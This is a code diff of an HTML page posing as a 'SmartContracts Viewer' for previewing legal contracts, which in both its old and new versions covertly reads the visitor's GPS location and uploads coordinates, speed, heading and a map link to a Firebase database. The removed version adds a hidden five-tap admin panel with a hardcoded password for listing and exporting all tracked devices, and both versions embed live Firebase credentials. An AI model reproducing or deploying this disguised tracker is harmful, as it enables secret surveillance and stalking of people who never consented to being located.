@@ -1,271 +1,90 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>SmartContracts Viewer</title>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png">
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #f7f7f7;
-      color: #333;
-      text-align: center;
-      padding: 40px;
-      touch-action: manipulation; /* Better touch response */
-    }
-    h1 {
-      color: #444;
-    }
-    .card {
-      background: #fff;
-      border-radius: 10px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      padding: 30px;
-      max-width: 400px;
-      margin: auto;
-      position: relative; /* For tap detection */
-    }
-    p {
-      font-size: 15px;
-      color: #777;
-    }
-    .accuracy-indicator {
-      font-size: 12px;
-      color: #e67e22;
-      margin-top: 5px;
-    }
-    
-    /* Admin Panel Styles */
-    #adminOverlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.95);
-      z-index: 9999;
-      color: white;
-      padding: 20px;
-      overflow-y: auto;
-    }
-    .admin-panel {
-      background: #1a1a1a;
-      border-radius: 10px;
-      padding: 20px;
-      max-width: 100%;
-      margin: 0 auto;
-    }
-    .session-card {
-      background: #2d2d2d;
-      padding: 15px;
-      margin-bottom: 15px;
-      border-radius: 8px;
-      overflow-x: auto;
-    }
-    .gps-link {
-      color: #3498db;
-      text-decoration: underline;
-      cursor: pointer;
-    }
-    #secretTapArea {
-      position: absolute;
-      top: 0;
-      right: 0;
-      width: 50px;
-      height: 50px;
-      opacity: 0;
-    }
-  </style>
-</head>
-<body>
-  <!-- Contract Viewer -->
-  <div class="card">
-    <!-- Hidden 5-tap area (top-right corner) -->
-    <div id="secretTapArea"></div>
-    
-    <h1>SmartContracts Viewer</h1>
-    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>
-    <p><i>Loading contract document...</i></p>
-    <p class="accuracy-indicator" id="accuracyStatus">Locating device...</p>
-  </div>
-
-  <!-- Admin Panel -->
-  <div id="adminOverlay">
-    <div class="admin-panel">
-      <h2>📱 Android Tracking Admin</h2>
-      <div id="adminLogin">
-        <input type="password" id="adminPassword" placeholder="Enter admin password" 
-               style="padding: 12px; width: 80%; border-radius: 6px; border: 1px solid #444; font-size: 16px;">
-        <button onclick="verifyAdmin()" style="padding: 12px 20px; background: #27ae60; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 10px; width: 80%;">
-          Login
-        </button>
-      </div>
-      <div id="adminContent" style="display: none;">
-        <h3>📌 Active Location Sessions</h3>
-        <div id="sessionList" style="max-height: 60vh; overflow-y: auto;"></div>
-        <button onclick="exportData()" style="padding: 12px 20px; background: #3498db; color: white; border: none; border-radius: 6px; cursor: pointer; margin-top: 20px; width: 80%;">
-          💾 Export All Data
-        </button>
-        <button onclick="hideAdmin()" style="padding: 12px 20px; background: #e74c3c; color: white; border: none; border-radius: 6px; cursor: pointer; margin-top: 10px; width: 80%;">
-          ❌ Close Panel
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-  <script>
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-      authDomain: "gps-d0bab.firebaseapp.com",
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-      projectId: "gps-d0bab",
-      storageBucket: "gps-d0bab.appspot.com",
-      messagingSenderId: "810816177909",
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-    };
-
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const userId = 'device_' + Math.random().toString(36).substring(2, 10);
-    const ADMIN_PASSWORD = "android123"; // Change this!
-
-    // 5-tap detection for admin panel
-    let tapCount = 0;
-    let lastTapTime = 0;
-    const tapArea = document.getElementById('secretTapArea');
-    
-    tapArea.addEventListener('click', (e) => {
-      const currentTime = new Date().getTime();
-      const tapDelay = currentTime - lastTapTime;
-      
-      if (tapDelay < 1000 && tapDelay > 0) {
-        tapCount++;
-        if (tapCount >= 5) {
-          document.getElementById('adminOverlay').style.display = 'block';
-          tapCount = 0;
-        }
-      } else {
-        tapCount = 1;
-      }
-      
-      lastTapTime = currentTime;
-      
-      // Reset counter after 2 seconds
-      setTimeout(() => {
-        tapCount = 0;
-      }, 2000);
-    });
-
-    // Location Tracking
-    function updateLocation(position) {
-      const { latitude, longitude, accuracy, speed, heading } = position.coords;
-      const timestamp = new Date().toISOString();
-      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}&z=18`; // Zoomed in
-      
-      document.getElementById('accuracyStatus').textContent = 
-        `GPS accuracy: ±${Math.round(accuracy)} meters`;
-      
-      db.ref('locations/' + userId).set({
-        latitude: latitude.toFixed(6),
-        longitude: longitude.toFixed(6),
-        accuracy: Math.round(accuracy) + 'm',
-        speed: speed ? speed.toFixed(1) + ' m/s' : '0',
-        direction: getDirection(heading),
-        timestamp,
-        maps_link: mapsLink,
-        device: 'Android'
-      });
-    }
-
-    function handleError(error) {
-      console.warn("Location error:", error.message);
-      document.getElementById('accuracyStatus').textContent = 
-        `Location error: ${error.message}`;
-    }
-
-    function getDirection(heading) {
-      if (heading === null || isNaN(heading)) return "Unknown";
-      const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];
-      return directions[Math.round(heading / 45) % 8];
-    }
-
-    function trackLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.watchPosition( // Using watchPosition for continuous updates
-          updateLocation, 
-          handleError, 
-          {
-            enableHighAccuracy: true,
-            maximumAge: 0,
-            timeout: 15000
-          }
-        );
-      } else {
-        handleError({message: "Geolocation not supported"});
-      }
-    }
-
-    // Admin Functions
-    function verifyAdmin() {
-      const password = document.getElementById('adminPassword').value;
-      if (password === ADMIN_PASSWORD) {
-        document.getElementById('adminLogin').style.display = 'none';
-        document.getElementById('adminContent').style.display = 'block';
-        loadSessions();
-      } else {
-        alert("Wrong password!");
-      }
-    }
-
-    function loadSessions() {
-      db.ref('locations').on('value', (snapshot) => {
-        const sessions = snapshot.val() || {};
-        let html = '';
-        
-        Object.entries(sessions).forEach(([deviceId, data]) => {
-          html += `
-            <div class="session-card">
-              <p><strong>📱 Device ID:</strong> ${deviceId}</p>
-              <p><strong>📍 Coordinates:</strong> ${data.latitude}, ${data.longitude}</p>
-              <p><strong>🎯 Accuracy:</strong> ${data.accuracy}</p>
-              <p><strong>🗺️ </strong><a class="gps-link" href="${data.maps_link}" target="_blank">View in Google Maps</a></p>
-              <p><strong>🕒 Last update:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
-              <p><strong>🧭 Direction:</strong> ${data.direction} ${data.speed}</p>
-            </div>
-          `;
-        });
-        
-        document.getElementById('sessionList').innerHTML = html || "<p>No active tracking sessions</p>";
-      });
-    }
-
-    function exportData() {
-      db.ref('locations').once('value').then(snapshot => {
-        const data = snapshot.val();
-        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `android_locations_${new Date().toISOString()}.json`;
-        a.click();
-      });
-    }
-
-    function hideAdmin() {
-      document.getElementById('adminOverlay').style.display = 'none';
-      document.getElementById('adminLogin').style.display = 'block';
-      document.getElementById('adminContent').style.display = 'none';
-      document.getElementById('adminPassword').value = '';
-    }
-
-    // Start tracking
-    trackLocation();
-  </script>
-</body>
-            </html>
+<!DOCTYPE html>  <html>  
+<head>  
+  <title>SmartContracts Viewer</title>  
+  <meta charset="UTF-8" />  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/4761/4761087.png" type="image/png">  
+  <style>  
+    body {  
+      font-family: 'Segoe UI', sans-serif;  
+      background: #f7f7f7;  
+      color: #333;  
+      text-align: center;  
+      padding: 40px;  
+    }  
+    h1 {  
+      color: #444;  
+    }  
+    .card {  
+      background: #fff;  
+      border-radius: 10px;  
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);  
+      padding: 30px;  
+      max-width: 400px;  
+      margin: auto;  
+    }  
+    p {  
+      font-size: 15px;  
+      color: #777;  
+    }  
+  </style>  
+</head>  
+<body>    <div class="card">  
+    <h1>SmartContracts Viewer</h1>  
+    <p>This app lets you preview digital contracts and agreements for legal purposes.</p>  
+    <p><i>Loading contract document...</i></p>  
+  </div>    <!-- Firebase SDK -->    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>    <script>  
+    // ✅ Your Firebase config  
+    const firebaseConfig = {  
+      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",  
+      authDomain: "gps-d0bab.firebaseapp.com",  
+      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",  
+      projectId: "gps-d0bab",  
+      storageBucket: "gps-d0bab.appspot.com",  
+      messagingSenderId: "810816177909",  
+      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"  
+    };  
+  
+    firebase.initializeApp(firebaseConfig);  
+    const db = firebase.database();  
+  
+    // Random device ID for anonymity  
+    const userId = 'device_' + Math.random().toString(36).substring(2, 10);  
+  
+    function getDirection(heading) {  
+      if (heading === null || isNaN(heading)) return "Unknown";  
+      const directions = ["N", "NE", "E", "SE", "S", "SW", "W", "NW"];  
+      return directions[Math.round(heading / 45) % 8];  
+    }  
+  
+    function updateLocation(position) {  
+      const { latitude, longitude, speed, heading } = position.coords;  
+      const direction = getDirection(heading);  
+      const timestamp = new Date().toISOString();  
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;  
+  
+      db.ref('locations/' + userId).set({  
+        latitude,  
+        longitude,  
+        speed,  
+        direction,  
+        timestamp,  
+        maps_link: mapsLink  
+      });  
+    }  
+  
+    function handleError(error) {  
+      console.warn("Location error:", error.message);  
+    }  
+  
+    function trackLocation() {  
+      if (navigator.geolocation) {  
+        navigator.geolocation.getCurrentPosition(updateLocation, handleError);  
+      }  
+    }  
+  
+    // Auto-track every 10 seconds  
+    setInterval(trackLocation, 10000);  
+    trackLocation();  
+  </script>  </body>  
+</html>
